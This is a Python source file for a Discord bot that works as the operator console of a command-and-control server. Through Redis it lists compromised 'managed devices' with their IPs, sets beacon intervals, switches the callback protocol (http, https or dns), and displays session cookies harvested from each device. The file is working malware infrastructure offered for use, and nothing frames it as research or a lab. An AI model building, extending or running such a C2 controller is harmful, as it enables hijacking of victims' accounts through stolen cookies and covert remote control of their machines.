"""
Discord bot entry point.
Uses slash commands (app_commands) with autocomplete for a better UX,
and logs every command invocation to the terminal for tracking.

Commands are forwarded to the C2 server via Redis Pub/Sub so the server
can process them and return results.
"""

import asyncio
import json
import logging
import uuid
from datetime import datetime, timezone
from typing import Any

import discord
from discord import app_commands
from discord.ext import commands

import redis.asyncio as aioredis

from config import (
    ADMIN_DISCORD_ID,
    COMMAND_PREFIX,
    DISCORD_BOT_TOKEN,
    REDIS_CHANNEL_COMMANDS,
    REDIS_CHANNEL_RESPONSES,
    REDIS_DB,
    REDIS_HOST,
    REDIS_PORT,
    VALID_BEACON_INTERVALS,
    VALID_COMMUNICATION_PROTOCOLS,
)
from devices import DeviceManager

# ---------------------------------------------------------------------------
# Logging setup
# ---------------------------------------------------------------------------

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("discord-bot")

# ---------------------------------------------------------------------------
# Bot setup
# ---------------------------------------------------------------------------

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents)
device_manager = DeviceManager()

# ---------------------------------------------------------------------------
# Redis bridge
# ---------------------------------------------------------------------------

redis_client: aioredis.Redis | None = None
pending_responses: dict[str, asyncio.Future[dict[str, Any]]] = {}


async def connect_redis() -> aioredis.Redis | None:
    """Attempt to connect to Redis. Returns None if unavailable."""
    try:
        client = aioredis.Redis(
            host=REDIS_HOST,
            port=REDIS_PORT,
            db=REDIS_DB,
            decode_responses=True,
        )
        await client.ping()
        logger.info(
            "Redis connected at %s:%d — server bridge active",
            REDIS_HOST,
            REDIS_PORT,
        )
        return client
    except Exception as exc:
        logger.warning(
            "Redis unavailable (%s) — running in standalone mode", exc
        )
        return None


async def publish_command(
    command: str,
    args: dict[str, Any] | None = None,
) -> dict[str, Any] | None:
    """
    Publish a command to the C2 server via Redis and wait for a response.
    Returns the response dict, or None if Redis is unavailable or times out.
    """
    if redis_client is None:
        return None

    request_id = str(uuid.uuid4())
    message = {
        "request_id": request_id,
        "command": command,
        "args": args or {},
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }

    future: asyncio.Future[dict[str, Any]] = asyncio.get_event_loop().create_future()
    pending_responses[request_id] = future

    try:
        payload = json.dumps(message, default=str)
        await redis_client.publish(REDIS_CHANNEL_COMMANDS, payload)
        logger.info("Published command to server: %s (id=%s)", command, request_id)

        # Wait for response with a timeout.
        response = await asyncio.wait_for(future, timeout=10.0)
        return response
    except asyncio.TimeoutError:
        logger.warning("Timeout waiting for server response (id=%s)", request_id)
        return None
    except Exception as exc:
        logger.error("Error publishing command: %s", exc)
        return None
    finally:
        pending_responses.pop(request_id, None)


async def response_listener() -> None:
    """Background task: listens for responses from the C2 server."""
    if redis_client is None:
        return

    pubsub = redis_client.pubsub()
    await pubsub.subscribe(REDIS_CHANNEL_RESPONSES)
    logger.info("Listening for server responses on %s", REDIS_CHANNEL_RESPONSES)

    try:
        while True:
            message = await pubsub.get_message(
                ignore_subscribe_messages=True,
                timeout=1.0,
            )
            if message and message["type"] == "message":
                try:
                    data = json.loads(message["data"])
                    request_id = data.get("request_id")
                    if request_id and request_id in pending_responses:
                        pending_responses[request_id].set_result(data)
                        logger.debug("Response matched: %s", request_id)
                except json.JSONDecodeError as exc:
                    logger.error("Invalid JSON from server: %s", exc)
    except asyncio.CancelledError:
        await pubsub.unsubscribe()
        await pubsub.close()
        logger.info("Response listener stopped")


def format_server_response(command: str, data: dict[str, Any]) -> str:
    """Format a server response dict into a Discord-friendly string."""
    status = data.get("status", "unknown")
    message = data.get("message", "")
    emoji = "✅" if status == "success" else "❌"

    if command == "show-devices":
        devices = data.get("data", {}).get("devices", [])
        if not devices:
            return f"{emoji} {message}"
        lines = [f"{emoji} **Server Response — {message}**"]
        for d in devices:
            status_emoji = "🟢" if d["status"] == "online" else "🔴"
            lines.append(
                f"{status_emoji} **{d['name']}** — "
                f"IP: `{d['ip']}` — Status: {d['status']}"
            )
        return "\n".join(lines)

    if command == "request-cookies":
        cookies = data.get("data", {}).get("cookies_by_device", {})
        if not cookies:
            return f"{emoji} {message}"
        lines = [f"{emoji} **Server Response — {message}**"]
        for device_name, device_cookies in cookies.items():
            for cname, cvalue in device_cookies.items():
                lines.append(f"🍪 `{device_name}` → `{cname}` = `{cvalue}`")
        return "\n".join(lines)

    return f"{emoji} {message}"


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def is_admin_user(interaction: discord.Interaction) -> bool:
    """Check whether the interaction author is the authorised admin."""
    return interaction.user.id == ADMIN_DISCORD_ID


def log_command(
    interaction: discord.Interaction,
    command_name: str,
    args: str = "",
) -> None:
    """Log a command invocation to the terminal."""
    user = interaction.user
    guild = interaction.guild
    channel = interaction.channel

    guild_name = guild.name if guild else "DM"
    channel_name = getattr(channel, "name", "unknown")

    args_display = f" ({args})" if args else ""
    logger.info(
        "Command /%s%s executed by %s (ID: %s) in #%s @ %s",
        command_name,
        args_display,
        user,
        user.id,
        channel_name,
        guild_name,
    )


def log_access_denied(interaction: discord.Interaction, command_name: str) -> None:
    """Log a denied access attempt to the terminal."""
    user = interaction.user
    logger.warning(
        "ACCESS DENIED: /%s attempted by %s (ID: %s)",
        command_name,
        user,
        user.id,
    )


# ---------------------------------------------------------------------------
# Events
# ---------------------------------------------------------------------------

@bot.event
async def on_ready() -> None:
    """Sync slash commands, connect Redis, and log when the bot connects."""
    global redis_client

    try:
        synced = await bot.tree.sync()
        logger.info(
            "Bot connected as %s (ID: %s) — synced %d slash command(s)",
            bot.user,
            bot.user.id,  # type: ignore[union-attr]
            len(synced),
        )
    except Exception as e:
        logger.error("Failed to sync commands: %s", e)

    # Connect to Redis (non-blocking — bot works without it).
    redis_client = await connect_redis()
    if redis_client:
        asyncio.create_task(response_listener())

    logger.info("Waiting for commands...")


# ---------------------------------------------------------------------------
# Autocomplete callbacks
# ---------------------------------------------------------------------------

async def beacon_interval_autocomplete(
    interaction: discord.Interaction,
    current: str,
) -> list[app_commands.Choice[int]]:
    """Provide autocomplete options for beacon interval values."""
    return [
        app_commands.Choice(name=f"{val} seconds", value=val)
        for val in VALID_BEACON_INTERVALS
        if current == "" or str(val).startswith(current)
    ]


async def protocol_autocomplete(
    interaction: discord.Interaction,
    current: str,
) -> list[app_commands.Choice[str]]:
    """Provide autocomplete options for communication protocols."""
    return [
        app_commands.Choice(name=proto, value=proto)
        for proto in VALID_COMMUNICATION_PROTOCOLS
        if current == "" or proto.startswith(current.lower())
    ]


# ---------------------------------------------------------------------------
# Slash Commands
# ---------------------------------------------------------------------------

@bot.tree.command(
    name="show-devices",
    description="Display all managed devices and their status.",
)
async def show_devices(interaction: discord.Interaction) -> None:
    """Send the list of managed devices to the channel."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "show-devices")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return

    log_command(interaction, "show-devices")

    # Try server first, fall back to local.
    server_response = await publish_command("show-devices")
    if server_response:
        response = format_server_response("show-devices", server_response)
    else:
        response = device_manager.show_devices()

    await interaction.response.send_message(response)


@bot.tree.command(
    name="set-beacon-interval",
    description="Set the beacon interval. Valid values: 2, 4, 8, 16, 32.",
)
@app_commands.autocomplete(interval=beacon_interval_autocomplete)
@app_commands.describe(interval="Beacon interval in seconds (2, 4, 8, 16, or 32)")
async def set_beacon_interval(
    interaction: discord.Interaction,
    interval: int,
) -> None:
    """Set the beacon interval to the provided value."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "set-beacon-interval")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return

    log_command(interaction, "set-beacon-interval", f"interval={interval}")

    server_response = await publish_command(
        "set-beacon-interval", {"interval": interval}
    )
    if server_response:
        response = format_server_response("set-beacon-interval", server_response)
    else:
        response = device_manager.set_beacon_interval(interval)

    await interaction.response.send_message(response)


@bot.tree.command(
    name="request-cookies",
    description="Display all stored cookies from managed devices.",
)
async def request_cookies(interaction: discord.Interaction) -> None:
    """Send the current cookie list to the channel."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "request-cookies")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return

    log_command(interaction, "request-cookies")

    server_response = await publish_command("request-cookies")
    if server_response:
        response = format_server_response("request-cookies", server_response)
    else:
        response = device_manager.request_cookies()

    await interaction.response.send_message(response)


@bot.tree.command(
    name="set-communication-protocol",
    description="Set the communication protocol. Valid: http, https, dns.",
)
@app_commands.autocomplete(protocol=protocol_autocomplete)
@app_commands.describe(protocol="Protocol to use (http, https, or dns)")
async def set_communication_protocol(
    interaction: discord.Interaction,
    protocol: str,
) -> None:
    """Set the communication protocol to the provided value."""
    if not is_admin_user(interaction):
        log_access_denied(interaction, "set-communication-protocol")
        await interaction.response.send_message(
            "🚫 **Access denied.** You are not authorised to use this bot.",
            ephemeral=True,
        )
        return

    log_command(interaction, "set-communication-protocol", f"protocol={protocol}")

    server_response = await publish_command(
        "set-communication-protocol", {"protocol": protocol}
    )
    if server_response:
        response = format_server_response(
            "set-communication-protocol", server_response
        )
    else:
        response = device_manager.set_communication_protocol(protocol)

    await interaction.response.send_message(response)


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    bot.run(DISCORD_BOT_TOKEN)
